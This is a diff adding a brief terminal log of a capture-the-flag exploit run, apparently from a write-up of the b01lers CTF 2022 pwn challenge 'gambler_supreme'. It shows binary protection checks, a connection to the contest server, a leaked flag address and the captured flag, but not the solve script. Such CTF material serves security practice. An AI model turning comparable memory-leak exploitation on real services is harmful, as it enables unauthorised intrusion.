@@ -1,0 +1,11 @@
+mito@ubuntu:~/CTF/b01lers_CTF_2022/Pwn_gambler_supreme$ python solve.py r
+[*] '/home/mito/CTF/b01lers_CTF_2022/Pwn_gambler_supreme/gambler_supreme'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to ctf.b01lers.com on port 9201: Done
+flag_addr = 0x20db490
+[*] Switching to interactive mode
+Your guess: bctf{1_w4nn4_b3_th3_pr0_g4mb13r}
